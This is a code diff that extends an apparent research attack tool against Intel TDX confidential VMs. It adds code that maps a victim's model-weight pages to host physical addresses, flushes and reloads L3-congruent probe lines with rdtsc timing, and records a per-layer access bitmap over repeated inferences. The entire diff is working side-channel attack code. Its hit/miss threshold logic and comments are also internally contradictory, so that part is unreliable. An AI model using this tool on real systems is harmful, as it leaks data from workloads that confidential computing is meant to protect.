@@ -37,6 +37,8 @@
 #include <time.h>
 #include <stdint.h>
 #include <string.h>
+#include <sys/mman.h>
+#include <sys/types.h>
 
 #define CRESET "\033[39m"
 #define CGRN   "\033[92m"
@@ -65,6 +67,17 @@ static int      counter_active        = 0;
 static int      llc_refs_fd           = -1;
 static int      llc_misses_fd         = -1;
 static uint64_t baseline_probe_cycles = 0;
+
+// ---------------------------------------------------------------------------
+// Gen 2: per-cache-line spatial bitmap state
+// ---------------------------------------------------------------------------
+#define PAGE_SIZE_4K     4096
+#define LINES_PER_PAGE   (PAGE_SIZE_4K / CACHE_LINE)   // 64
+#define L3_SETS          32768   // 22.5MB L3 / 64B line / 11 ways (approx)
+
+static int     current_offset  = 0;              // 0..63, which 64B line we probe
+static uint8_t bitmap[16][LINES_PER_PAGE];       // [layer][offset] -> 0/1/0xff
+static unsigned long last_weight_hpa = 0;        // HPA of victim weight page
 
 // ---------------------------------------------------------------------------
 // Low-level helpers
@@ -100,6 +113,110 @@ static inline void cldemote_line(void *p) {
     clflush_line(p);
 }
 #endif
+
+
+/*
+ * get_hpa_from_gpa - read the SEPT entry for a GPA and extract the HPA.
+ *
+ * Uses the existing seamcall_tdh_mem_sept_rd call. Returns 0 on failure.
+ * No kernel modification needed — this SEAMCALL is already available.
+ */
+static unsigned long get_hpa_from_gpa(int util_fd, unsigned long gpa,
+                                      unsigned long tdr_pa) {
+    union tdx_sept_entry entry;
+    unsigned long rc;
+
+    /* Try 2MB level first */
+    rc = seamcall_tdh_mem_sept_rd(util_fd, 1,
+                                  gpa & ~((1ul << 21) - 1),
+                                  tdr_pa, (void *)&entry, NULL);
+    if (rc == TDX_SUCCESS && entry.pfn)
+        return (unsigned long)entry.pfn << 12;
+
+    /* Fall back to 4KB level */
+    rc = seamcall_tdh_mem_sept_rd(util_fd, 0,
+                                  gpa & ~0xffful,
+                                  tdr_pa, (void *)&entry, NULL);
+    if (rc == TDX_SUCCESS && entry.pfn)
+        return (unsigned long)entry.pfn << 12;
+
+    return 0;
+}
+
+/*
+ * probe_line_for_set - find a line in our probe buffer that maps to the
+ * same L3 cache set as the given HPA.
+ *
+ * L3 set index = (PA >> 6) & (L3_SETS - 1)  [bits 6..20 for 32K sets]
+ * We scan our probe buffer for a line whose PA matches that set index.
+ * Since probe_buf is contiguous, we can compute the PA of each line as
+ * probe_buf_pa + i*CACHE_LINE where probe_buf_pa is the physical address
+ * of the start of the probe buffer (obtained once via /proc/self/pagemap).
+ */
+static unsigned long probe_buf_pa = 0;   /* physical address of probe_buf[0] */
+
+static void init_probe_buf_pa(void) {
+    int fd = open("/proc/self/pagemap", O_RDONLY);
+    if (fd < 0) { perror("open pagemap"); return; }
+
+    unsigned long vaddr  = (unsigned long)probe_buf;
+    unsigned long pfn_idx = vaddr / 4096;
+    uint64_t entry = 0;
+
+    if (lseek(fd, (off_t)(pfn_idx * 8), SEEK_SET) < 0 ||
+        read(fd, &entry, 8) != 8) {
+        perror("pagemap read");
+        close(fd);
+        return;
+    }
+    close(fd);
+
+    if (!(entry & (1ULL << 63))) {
+        fprintf(stderr, "probe_buf page not present in pagemap\n");
+        return;
+    }
+
+    probe_buf_pa = (unsigned long)((entry & ((1ULL << 55) - 1)) << 12)
+                   | (vaddr & 0xfff);
+    printf(CYEL "[gen2] probe_buf VA=0x%lx PA=0x%lx\n" CRESET,
+           vaddr, probe_buf_pa);
+}
+
+static void *get_probe_line_for_hpa(unsigned long hpa) {
+    if (!probe_buf_pa || !hpa) return NULL;
+
+    unsigned long target_set = (hpa >> 6) & (L3_SETS - 1);
+
+    for (size_t i = 0; i < PROBE_SIZE; i += CACHE_LINE) {
+        unsigned long line_pa  = probe_buf_pa + i;
+        unsigned long line_set = (line_pa >> 6) & (L3_SETS - 1);
+        if (line_set == target_set)
+            return &probe_buf[i];
+    }
+    return NULL;
+}
+
+static void print_bitmap(void) {
+    int layer, off;
+    printf(CYEL "\n=== Gen 2 Spatial Access Bitmap ===\n" CRESET);
+    printf("        ");
+    for (off = 0; off < LINES_PER_PAGE; off++) printf("%d", off % 10);
+    printf("\n");
+    for (layer = 0; layer < 16; layer++) {
+        int has = 0;
+        for (off = 0; off < LINES_PER_PAGE; off++)
+            if (bitmap[layer][off] != 0xff) { has = 1; break; }
+        if (!has) continue;
+        printf("layer%2d ", layer);
+        for (off = 0; off < LINES_PER_PAGE; off++) {
+            if      (bitmap[layer][off] == 0xff) printf(".");
+            else if (bitmap[layer][off] == 1)    printf("1");
+            else                                  printf("0");
+        }
+        printf("\n");
+    }
+    printf(CYEL "====================================\n" CRESET);
+}
 
 // ---------------------------------------------------------------------------
 // Probe buffer lifecycle
@@ -395,6 +512,8 @@ int main(int argc, char *argv[]) {
     }
 
     init_probe_buffer();
+    memset(bitmap, 0xff, sizeof(bitmap));
+    init_probe_buf_pa();
     init_perf_counters();
 
     util_fd = open("/dev/" TDXUTILS_DEVICE_NAME, O_RDWR);
@@ -448,27 +567,83 @@ int main(int argc, char *argv[]) {
         uint64_t post_cycles = 0;
 
         if (is_start_marker(idx)) {
-            // Seat probe buffer in L3 and record baseline read latency.
-            // This happens while the victim is frozen at the START marker.
+            // Gen 1: seat probe buffer in L3, record baseline.
             prepare_probe_buffer();
             baseline_probe_cycles = measure_probe_cycles();
-
-            // Start LLC counters after probe measurement so our own reads
-            // are excluded from the layer's LLC statistics.
             reset_start_counters();
             expected_end_idx = matching_end_marker(idx);
+
+            // Gen 2: get HPA of the faulting weight page and flush the
+            // probe buffer line that maps to the same L3 cache set.
+            // All done in userspace — no kernel changes needed.
+            last_weight_hpa = get_hpa_from_gpa(util_fd,
+                                               address_accessed, tdr_pa);
+            if (last_weight_hpa) {
+                unsigned long target_hpa = last_weight_hpa
+                                         + (current_offset * CACHE_LINE);
+                void *probe_line = get_probe_line_for_hpa(target_hpa);
+                if (probe_line) {
+                    clflush_line(probe_line);
+                    mfence_all();
+                }
+            }
         }
 
         if (is_end_marker(idx) && counter_active) {
-            // Stop LLC counters before probe re-measurement so our reads
-            // are not counted in the layer's LLC statistics.
+            // Gen 1: stop counters and re-measure probe buffer.
             stop_read_counters(&llc_refs, &llc_misses);
             counter_active   = 0;
             expected_end_idx = -1;
-
-            // Re-measure probe latency. Lines evicted by the victim now
-            // require a DRAM fetch. delta = post - baseline = signal.
             post_cycles = measure_probe_cycles();
+
+            // Gen 2: reload the same probe line we flushed at START.
+            // Time how long it takes — slow = victim warmed that cache
+            // set (HIT, bit=1), fast = victim never touched it (MISS, bit=0).
+            if (last_weight_hpa) {
+                unsigned long target_hpa = last_weight_hpa
+                                         + (current_offset * CACHE_LINE);
+                void *probe_line = get_probe_line_for_hpa(target_hpa);
+                if (probe_line) {
+                    int layer_idx = (idx / 2) - 1;
+                    uint64_t t1, t2, reload_delta;
+                    volatile unsigned char dummy;
+
+                    mfence_all();
+                    t1 = rdtsc();
+                    dummy = *(volatile unsigned char *)probe_line;
+                    mfence_all();
+                    t2 = rdtsc();
+                    reload_delta = t2 - t1;
+                    (void)dummy;
+
+                    // L3 hit ~150-300 cycles, L1/L2 hit ~10-50 cycles,
+                    // DRAM miss ~800+ cycles. Threshold at 400:
+                    // fast (<400) = line still cold = victim did NOT touch
+                    // this cache set = MISS = bit 0.
+                    // slow (>=400) = line was warmed by victim = HIT = bit 1.
+                    uint8_t bit = (reload_delta >= 400) ? 1 : 0;
+
+                    if (layer_idx >= 0 && layer_idx < 16)
+                        bitmap[layer_idx][current_offset] = bit;
+
+                    printf(CYEL
+                           "  [gen2] layer=%d offset=%d reload=%lu -> bit=%d\n"
+                           CRESET,
+                           layer_idx, current_offset,
+                           (unsigned long)reload_delta, bit);
+
+                    // Advance to next cache line offset.
+                    // One offset is probed per full inference cycle.
+                    // After 64 inferences the full page bitmap is complete.
+                    current_offset = (current_offset + 1) % LINES_PER_PAGE;
+                    if (current_offset == 0) {
+                        print_bitmap();
+                        printf(CYEL
+                               "[gen2] Full page scanned (%d inferences)."
+                               " Restarting.\n" CRESET, LINES_PER_PAGE);
+                    }
+                }
+            }
         }
 
         printf(CGRN
@@ -501,6 +676,7 @@ int main(int argc, char *argv[]) {
         exit(EXIT_FAILURE);
     }
 
+    print_bitmap();
     free(gpa);
     return 0;
 }
